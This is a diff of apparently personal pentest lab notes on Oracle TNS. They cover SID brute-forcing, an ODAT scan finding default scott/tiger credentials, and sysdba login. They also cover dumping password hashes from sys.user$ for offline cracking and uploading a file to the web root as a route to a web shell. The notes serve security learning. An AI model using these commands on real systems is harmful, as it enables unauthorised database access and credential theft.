@@ -9,14 +9,18 @@ tags: []
 <!-- Nmap {{{-->
 ## Nmap
 
-> [!todo]
+Scan the default Oracle [[General#TNS Listener|TNS Listener]] port
 
 ```sh
-sudo nmap -p1521 -sV 10.129.204.235 --open
+sudo nmap -p1521 -sV <target_ip> --open
 ```
 
-> [!info]- Output
+<!-- Example {{{-->
+> [!example]-
 >
+> ```sh
+> sudo nmap -p1521 -sV 10.129.204.235 --open
+> ```
 > ```sh
 > Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
 > Nmap scan report for 10.129.204.235
@@ -28,17 +32,23 @@ sudo nmap -p1521 -sV 10.129.204.235 --open
 > Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 > Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
 > ```
+<!-- }}} -->
 
 ### SID Bruteforcing
 
-> [!todo]
+[[General#System Identifier|System Identifier]]s can be enumerated via various
+tools (e.g., `nmap`, `hydra`, `odat`)
 
 ```sh
-sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+sudo nmap -p1521 -sV <target_ip> --open --script oracle-sid-brute
 ```
 
-> [!info]- Output
+<!-- Example {{{-->
+> [!example]-
 >
+> ```sh
+> sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+> ```
 > ```sh
 > Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
 > Nmap scan report for 10.129.204.235
@@ -54,6 +64,8 @@ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
 > ```
 <!-- }}} -->
 
+<!-- }}} -->
+
 <!-- ODAT {{{-->
 ## ODAT
 
@@ -64,13 +76,14 @@ in Oracle databases
 
 ### Install
 
+Install [odat](https://www.kali.org/tools/odat/) with
+[apt](https://en.wikipedia.org/wiki/APT_(software))
+
 ```sh
 sudo apt install odat
 ```
 
-#### Manual Setup
-
-The following commands can be used to set up Oracle [odat](https://www.kali.org/tools/odat/)
+Install [[Enumeration#ODAT|ODAT]] manually
 
 <!-- Example {{{-->
 > [!example]-
@@ -107,131 +120,162 @@ The following commands can be used to set up Oracle [odat](https://www.kali.org/
 > ```
 <!-- }}} -->
 
-### Usage
+<!-- Enumeration {{{-->
+### Enumeration
 
-> [!todo]
-
-
-```sh
-./odat.py all -s 10.129.204.235
-```
+[[Enumeration#ODAT|ODAT]] can retrieve database names, versions, user accounts,
+vulnerabilities, misconfigurations
 
 ```sh
-[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
-[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
-
-...SNIP...
-
-[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
-[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
-[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
-[+] Valid credentials found: scott/tiger. Continue...
-
-...SNIP...
+./odat.py all -s <target_ip>
 ```
 
-<!-- }}} -->
-
-## SQLplus
-
-> [!todo]
-
-### Log In
-
-> [!todo]
-
-```sh
-sqlplus scott/tiger@10.129.204.235/XE
-```
-
-<!-- Output {{{-->
-> [!output]-
->
->```sh
->SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
->Version 21.4.0.0.0
->
->Copyright (c) 1982, 2021, Oracle. All rights reserved.
->
->ERROR:
->ORA-28002: the password will expire within 7 days
->
->
->
->Connected to:
->Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
->
->SQL>
->```
-<!-- }}} -->
-
-> [!tip]
->
-> In case of this error
+<!-- Example {{{-->
+> [!example]-
 >
 > ```sh
-> sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
+> ./odat.py all -s 10.129.204.235
 > ```
 >
-> Execute the following, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared)
+> The scan has found valid credentials :`scott`/`tiger`
 >
 > ```sh
-> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
-> ```
-
-### Oracle RDBMS
-
-Once [[Enumeration#Log In|logged in]],
-[Oracle RDBMS](https://www.oracle.com/database/what-is-a-relational-database/)
-can be explored
-
-#### Interaction
-
-> [!todo]
-
-```sql
-select table_name from all_tables;
-```
-
-<!-- Output {{{-->
-> [!info]- Output
->
-> ```
-> TABLE_NAME
-> ------------------------------
-> DUAL
-> SYSTEM_PRIVILEGE_MAP
-> TABLE_PRIVILEGE_MAP
-> STMT_AUDIT_OPTION_MAP
-> AUDIT_ACTIONS
-> WRR$_REPLAY_CALL_FILTER
-> HS_BULKLOAD_VIEW_OBJ
-> HS$_PARALLEL_METADATA
-> HS_PARTITION_COL_NAME
-> HS_PARTITION_COL_TYPE
-> HELP
+> [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
+> [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
 >
 > ...SNIP...
 >
+> [!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
+> [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
+> [!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
+> [+] Valid credentials found: scott/tiger. Continue...
 >
-> SQL> select * from user_role_privs;
->
-> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
-> ------------------------------ ------------------------------ --- --- ---
-> SCOTT                          CONNECT                        NO  YES NO
-> SCOTT                          RESOURCE                       NO  YES NO
+> ...SNIP...
 > ```
 <!-- }}} -->
 
-#### Database Enumeration
+<!-- }}} -->
+
+<!-- File Upload {{{-->
+### File Upload
+
+It may be possible to upload a web shell to the target if
+
+- the server is running a web server
+- the server's [[Webapp/General/Web Server Root#Default|root directory location]]
+  is known
+
+1. Create a payload
 
 ```sh
-sqlplus scott/tiger@10.129.204.235/XE as sysdba
+echo "Oracle File Upload Test" > testing.txt
 ```
 
-<!-- Output {{{-->
-> [!info]- Output
+2. Upload the file to the database
+
+```sh
+./odat.py utlfile -s <target_ip> -d XE -U <use> -P <password> --sysdba --putFile C:\\path\\to <file.ext> ./testing.txt
+```
+
+<!-- Example {{{-->
+> [!example]-
 >
+> ```sh
+> ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+> ```
+>
+> > [!info]-
+> >
+> > - `utlfile`: [Oracle UTL_FILE](https://docs.oracle.com/database/121/ARPLS/u_file.htm)
+> >   functionality to upload a file
+> > - `-s 10.129.204.235`: target IP of the Oracle instance.
+> > - `-d XE`: database/SID (Oracle XE).
+> > - `-U scott`: username
+> > - `-P tiger`: password in cleartext
+> > - `--sysdba`: run with SYSDBA privileges
+> > - `--putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`:
+> >   upload a file to the DB server's filesystem
+> >
+>
+> ```sh
+> [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
+> [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
+> ```
+<!-- }}} -->
+
+3. Test if the uppload worked with [cURL](https://curl.se/)
+
+```sh
+curl -X GET http://10.129.204.235/testing.txt
+```
+```sh
+Oracle File Upload Test
+```
+
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- SQL Plus {{{-->
+## SQL Plus
+
+[SQL Plus](https://en.wikipedia.org/wiki/SQL_Plus) is an
+[Oracle Database Utility](https://docs.oracle.com/cd/B14117_01/server.101/b12170/qstart.htm)
+CLI, commonly used by users, administrators and programmers
+
+<!-- Tip {{{-->
+> [!tip]
+>
+> List of SQL Plus
+> [commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
+>
+<!-- }}} -->
+
+<!-- Log In {{{-->
+### Log In
+
+Log in as regular user
+
+```sh
+sqlplus <username>/<password>@<target_ip>/XE
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> sqlplus scott/tiger@10.129.204.235/XE
+> ```
+> ```sh
+> SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
+> Version 21.4.0.0.0
+>
+> Copyright (c) 1982, 2021, Oracle. All rights reserved.
+>
+> ERROR:
+> ORA-28002: the password will expire within 7 days
+>
+>
+>
+> Connected to:
+> Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+>
+> SQL>
+> ```
+<!-- }}} -->
+
+Log in the regular user as `sysdba` (System Database Admin)
+
+```sh
+sqlplus <user>/<password>@<target_ip>/XE as sysdba
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> sqlplus scott/tiger@10.129.204.235/XE as sysdba
+> ```
 > ```sh
 > SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
 > Version 21.4.0.0.0
@@ -242,8 +286,11 @@ sqlplus scott/tiger@10.129.204.235/XE as sysdba
 > Connected to:
 > Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 >
->
+> ```
+> ```sh
 > SQL> select * from user_role_privs;
+> ```
+> ```sh
 >
 > USERNAME                       GRANTED_ROLE                   ADM DEF OS_
 > ------------------------------ ------------------------------ --- --- ---
@@ -267,15 +314,101 @@ sqlplus scott/tiger@10.129.204.235/XE as sysdba
 > ```
 <!-- }}} -->
 
-#### Extract Password Hashes
+<!-- Tip {{{-->
+> [!tip]
+>
+> In case of this error, execute the following
+> (*taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared)*)
+>
+> ```
+> sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
+> ```
+> ```sh
+> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+> ```
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- Interaction {{{-->
+### Interaction
+
+List all available tables in the
+[[General#Oracle RDBMS|Oracle RDBMS]]
+
+```sql
+select table_name from all_tables;
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sql
+> SQL> select table_name from all_tables;
+> ```
+> ```
+> TABLE_NAME
+> ------------------------------
+> DUAL
+> SYSTEM_PRIVILEGE_MAP
+> TABLE_PRIVILEGE_MAP
+> STMT_AUDIT_OPTION_MAP
+> AUDIT_ACTIONS
+> WRR$_REPLAY_CALL_FILTER
+> HS_BULKLOAD_VIEW_OBJ
+> HS$_PARALLEL_METADATA
+> HS_PARTITION_COL_NAME
+> HS_PARTITION_COL_TYPE
+> HELP
+>
+> ...SNIP...
+>
+> ```
+<!-- }}} -->
+
+Show current user privileges
+
+```sh
+select * from user_role_privs;
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> SQL> select * from user_role_privs;
+> ```
+> ```sh
+>
+> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+> ------------------------------ ------------------------------ --- --- ---
+> SCOTT                          CONNECT                        NO  YES NO
+> SCOTT                          RESOURCE                       NO  YES NO
+> ```
+>
+> - `scott` has no administrator privileges
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- Extract Password Hashes {{{-->
+### Extract Password Hashes
+
+Retrieve the password hashes of the `sys.user$` 
+[SYS.USER$](https://docs.oracle.com/database/121/ADMQS/GUID-CF1CD853-AF15-41EC-BC80-61918C73FDB5.htm#ADMQS12003)
+(the default administrative user account) and try to crack them offline
+
 
 ```sql
 select name, password from sys.user$;
 ```
 
-<!-- Output {{{-->
-> [!info]- Output
+<!-- Example {{{-->
+> [!example]-
 >
+> ```sql
+> select name, password from sys.user$;
+> ```
 > ```sh
 > NAME                           PASSWORD
 > ------------------------------ ------------------------------
@@ -299,22 +432,9 @@ select name, password from sys.user$;
 > ```
 <!-- }}} -->
 
-#### File Upload
+<!-- }}} -->
 
-```sh
-echo "Oracle File Upload Test" > testing.txt
-```
-```sh
-./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
-```
 
-<!-- Output {{{-->
-> [!info]- Output
->
-> ```sh
-> [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
-> [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
-> ```
 <!-- }}} -->
 
 <!-- Finger {{{-->
@@ -339,6 +459,36 @@ This is valuable reconnaissance material:
   `listener.ora`), an attacker could manipulate the TNS listener
   [[General#TNS Listener|TNS listener]] or connect directly to the database
 
-> [!todo]
+
+```sh
+finger oracle@<target_ip>
+```
+
+<!-- Exmaple {{{-->
+> [!example]-
+>
+> Simple (Unix)
+>
+> ```sh
+> finger oracle@10.129.204.235
+> ```
+>
+> Raw TCP (works when **finger** client is missing)
+>
+> ```sh
+> printf "oracle\r\n" | nc 10.129.204.235 79
+> ```
+>
+> ```sh
+> echo "oracle" | nc 10.129.204.235 79
+> ```
+>
+> Telnet interactive
+>
+> ```sh
+> telnet 10.129.204.235 79
+> # then type: oracle<Enter>
+> ```
+<!-- }}} -->
 
 <!-- }}} -->
